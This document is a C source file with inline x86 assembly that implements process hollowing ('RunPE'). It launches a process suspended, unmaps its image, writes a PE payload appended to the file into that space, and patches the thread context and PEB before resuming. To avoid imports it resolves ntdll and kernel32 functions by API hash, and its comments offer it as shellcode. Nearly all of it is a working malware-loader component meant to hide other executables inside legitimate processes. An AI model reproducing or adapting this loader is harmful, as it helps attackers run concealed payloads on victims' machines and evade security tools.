/*
PE injection and execution via 
	->Creating a Process suspended
	->Hollowing it out by removing its image
	->Planting another PE file's image in that space
	->Align Sections
	->Patch PEB and EAX
	->Resume the execution so another exe takes place of executed PE file.
	
	
run a PE file in memory of another via ntdll api's
no imports
api's dynamically retrieved
can be used as shellcode to achieve runPE mechanism
doesn't support relocation directory in PE header file as of yet


compiled with visual studion 2012
used /nostdlib
WinMainCRTStartup defaulted to 0x401000
*/





typedef BOOL (WINAPI *_CreateProcess)(
  HANDLE token,
  LPWSTR lpApplicationName,
  LPWSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCTSTR lpCurrentDirectory,
  LPSTARTUPINFO lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation,
  PHANDLE ttoken
);

typedef LONG (WINAPI *_NtUnmapViewOfSection)(
  HANDLE ProcessHandle,
  PVOID BaseAddress
);

typedef LPVOID (WINAPI *_VirtualAllocEx)(
   HANDLE ProcessHandle,
   PVOID *BaseAddress,
   ULONG_PTR ZeroBits,
   DWORD *RegionSize,
   ULONG AllocationType,
   ULONG Protect
);
typedef BOOL (WINAPI *_VirtualProtectEx)
( HANDLE hProcess,
  DWORD *lpAddress,
  DWORD *dwSize,
  DWORD flNewProtect,
  PDWORD lpflOldProtect
);
typedef BOOL (WINAPI *_ReadProcessMemory)(
  HANDLE hProcess,
  LPCVOID lpBaseAddress,
  LPVOID lpBuffer,
  SIZE_T nSize,
  SIZE_T *lpNumberOfBytesRead
);
typedef BOOL (WINAPI *_WriteProcessMemory)(
  HANDLE hProcess,
  LPVOID lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T nSize,
  SIZE_T* lpNumberOfBytesWritten
);

typedef BOOL (WINAPI *_GetThreadContext)(
  HANDLE hThread,
  LPCONTEXT lpContext
);

typedef BOOL (WINAPI *_SetThreadContext)(
  HANDLE hThread,
  const CONTEXT* lpContext
);

typedef DWORD (WINAPI *_ResumeThread)(
  HANDLE hThread
);

int WinMainCRTStartup()
{
	__asm
	{
		jmp endend
		endend1:
		pop ebx				;end of file and start of unencrypted PE file to be executed
		jmp Start			;starting
gpr:


;returns address of function in eax
;[esp+4] should be base of dll
;[esp+8] should be funchash

;e_lfanew=imagebase+3c
;PE signature =imagebase+e_lfanew
;EAT=PE signature+78h
;EAT  + 1c = aof RVA
;EAT  + 20 = aon RVA
;EAT  + 18 = number of functions
;[aof],[aof+4],[aof+8] = RVA of api addr
;[aon],[aon+4],[aon+8] = RVA of api name end by '\0'



		xor edi,edi
		rerun:
		mov eax,[esp+0x4]
		xor ebx,ebx
		add bx,[eax+0x3c]
		add eax,ebx ;eax= address of "PE"
		xor bx,bx
		add eax,0x78
		mov eax,[eax]     ;eax= EAT RVA
		add eax,[esp+0x4] ;eax= EAT VA
		cmp edi,[esp+8]
		je backagain
		mov ebx,[eax+0x20] ;ebx= aon RVA
		add ebx,[esp+0x4]  ;ebx=aon VA
		mov ecx,[eax+0x18] ;ecx=number of func
		xor edx,edx
		xor eax,eax

		sub ebx,4

back:
		test ecx,ecx
		jz last
	
		add ebx,4
		add edx,2

		mov esi,[ebx] 					;hash computing begins esi=string pointer till 0x00
		add esi,[esp+4]
		
		xor edi,edi
genhash:
		xor eax,eax
		lodsb
		test al,al
		jz later
		ror edi,0xd
		add edi,eax
		jmp genhash
later: 									;edi holds hash now
		cmp edi,[esp+8]
		jne neee
		jmp rerun
backagain: 								;eax=EAT VA again
		mov ebx,[eax+0x24]
		add ebx,[esp+4]
		add ebx,edx
		xor ecx,ecx
		mov cx,[ebx]
		mov ebx,[eax+0x1c] ;ebx=aof rva
		add ebx,[esp+4] ;ebx=aof rva
		add ecx,ecx
		add ecx,ecx
		add ebx,ecx
		sub ebx,4
		mov ebx,[ebx]
		mov eax,[esp+4]
		add eax,ebx
		add esp,0xc
		jmp DWORD ptr[esp-0xc]
		neee:
		xor eax,eax
		dec ecx
		jmp back
		last:
		ret
	
getntdll:								;returns ntdll base in eax
		xor eax,eax
		mov al,30h
		mov eax,fs:[eax]
		mov eax,[eax+0ch]
		mov eax,[eax+14h]
		mov eax,[eax]
		mov eax,[eax+10h]
		ret

getkernel32: ;returns kernel32 base in eax
		xor eax,eax
		mov al,30h
		mov eax,fs:[eax]
		mov eax,[eax+0ch]
		mov eax,[eax+14h]
		mov eax,[eax]
		mov eax,[eax]
		mov eax,[eax+10h]
		ret

Start:

	}
	
/*
hashes for known API's used
mov eax,0xdb4dfa88 //CreateProcessInternalW
mov eax,0xe938e3f3 //ZwGetContextThread
mov eax,0x3defa5c2 //ZwReadVirtualMemory
mov eax,0xf2d04fd0 //ZwUnmapViewOfSection
mov eax,0xd33d4aed //ZwAllocateVirtualMemory
mov eax,0xc5d0a4c2 //ZwWriteVirtualMemory
mov eax,0xbc3f4d89 //ZwProtectVirtualMemory
mov eax,0x6938e3f5 //ZwSetContextThread
mov eax,0x792cbc53 //ZwTerminateProcess
mov eax,0xcb4a46f8 //ZwResumeThread
*/
	_CreateProcess cp;
	_NtUnmapViewOfSection umap;
	_VirtualAllocEx alloc;
	_GetThreadContext gc;
	_SetThreadContext sc;
	_ReadProcessMemory rpm;
	_WriteProcessMemory wpm;
	_VirtualProtectEx vpm;
	_ResumeThread tp,rt;

	LPWSTR path;
	CONTEXT ctx;
	ctx.ContextFlags=CONTEXT_INTEGER;
	DWORD Mapping[8] = { PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE };
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo; 
	LPBYTE pBuffer;
	DWORD dwBaseAddr,dwBytes;
	DWORD i,temp;
	PIMAGE_NT_HEADERS pNT = NULL;
	PIMAGE_SECTION_HEADER pSections = NULL;

	__asm
	{
		
		mov pBuffer,ebx
		push 0xdb4dfa88 
		call getkernel32
		push eax
		call gpr
		mov cp,eax     //Fill CreateProcessA Address in variable cp
		
		
		push 0xf2d04fd0
		call getntdll
		push eax
		call gpr
		mov umap,eax   //Fill NtUnmapViewOfSection in variable umap
		
		
		push 0xd33d4aed
		call getntdll
		push eax
		call gpr
		mov alloc,eax //Fill ZwAllocVirtualMemory in variable alloc
		
		
		push 0x3defa5c2
		call getntdll
		push eax
		call gpr
		mov rpm,eax   //Fill ZwReadVirtualMemory in variable rpm
		
		
		push 0xc5d0a4c2
		call getntdll
		push eax
		call gpr
		mov wpm,eax   //Fill ZwWriteVirtualMemory in variable wpm
		
		
		push 0xbc3f4d89
		call getntdll
		push eax
		call gpr
		mov vpm,eax   //Fill ZwProtectVirtualMemory in variable vpm
		
		
		push 0xe938e3f3
		call getntdll
		push eax
		call gpr
		mov gc,eax    //Fill ZwGetContextThread in variable gc
		
		
		push 0x6938e3f5
		call getntdll
		push eax
		call gpr
		mov sc,eax    //Fill ZwSetContextThread in variable sc
		
		
		push 0x792cbc53
		call getntdll
		push eax
		call gpr
		mov tp,eax    //Fill ZwTerminateProcess in variable tp
		
		
		push 0xcb4a46f8 
		call getntdll
		push eax
		call gpr
		mov rt,eax    //Fill ZwResumeThread in variable rt
	}

	
	//filling path variable with argv[0]
	__asm
	{
	    mov eax,fs:[0x30]
		mov eax,[eax+0x10]
		mov eax,[eax+0x3c]
		mov [path],eax
	 
		xor eax,eax
		mov ecx,0x10
	    lea edi,pinfo
back0:
		stosb
		dec ecx
		cmp ecx,0
		jne back0

        mov ecx,0x44
	    lea edi,sinfo
back1:
		stosb
		dec ecx
		cmp ecx,0
		jne back1
	}
	
	sinfo.cb = sizeof(STARTUPINFO);
	sinfo.wShowWindow = 0;
    
	
	
	cp(0,path,0,0,0,0,0x4,0,0,&sinfo,&pinfo,0);
	if(pinfo.hProcess!=NULL)
	{
		gc(pinfo.hThread,&ctx);
		if(ctx.Ebx!=0)
		{
			rpm(pinfo.hProcess, (LPCVOID)(ctx.Ebx + 8), &dwBaseAddr, sizeof(DWORD), &dwBytes);
			if(dwBaseAddr!=NULL)
			{
			 if (umap(pinfo.hProcess, (LPVOID)dwBaseAddr) >= 0)
			 {
				 pNT = (PIMAGE_NT_HEADERS)((char*)pBuffer + ((PIMAGE_DOS_HEADER)pBuffer)->e_lfanew);
				 dwBaseAddr= (DWORD)pNT->OptionalHeader.ImageBase;
				 i=pNT->OptionalHeader.SizeOfImage;
				 alloc(pinfo.hProcess,(PVOID *)&dwBaseAddr,0,&i,0x3000,PAGE_READWRITE);
				 if(dwBaseAddr!=0&&i!=0)
				 {
					 if(wpm(pinfo.hProcess, (LPVOID)dwBaseAddr, pBuffer, pNT->OptionalHeader.SizeOfHeaders, &dwBytes)==0)
					 {
						 pSections = (PIMAGE_SECTION_HEADER)((char*)pNT + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + pNT->FileHeader.SizeOfOptionalHeader);
						 for (i = 0; i < pNT->FileHeader.NumberOfSections; i++) 
							{
								temp=dwBaseAddr + pSections[i].VirtualAddress;
								wpm(pinfo.hProcess, (LPVOID)((DWORD)dwBaseAddr + pSections[i].VirtualAddress), (LPVOID)((DWORD)pBuffer + pSections[i].PointerToRawData), pSections[i].SizeOfRawData, &dwBytes);
     							vpm(pinfo.hProcess, &temp, &pSections[i].Misc.VirtualSize, Mapping[pSections[i].Characteristics >> 29], &dwBytes);
							}
						 if (i == pNT->FileHeader.NumberOfSections && wpm(pinfo.hProcess, (LPVOID)(ctx.Ebx + 8), &dwBaseAddr, sizeof(LPVOID), &dwBytes)==0)
							{
								ctx.Eax = (DWORD)dwBaseAddr + pNT->OptionalHeader.AddressOfEntryPoint;
								if (sc(pinfo.hThread, &ctx) == 0)
								{
									rt(pinfo.hThread);
									goto end;
								}
							}
					 }
				 }
				 
			 }
			 
			}
		}
		__asm
		{
			push 0
		}
		tp((HANDLE)pinfo.hProcess);
	}
end:
	
	tp((HANDLE)-1,0);
	
	__asm
	{
endend:
		call endend1
	}
}
//whatever next to this is going to be executed in a new process
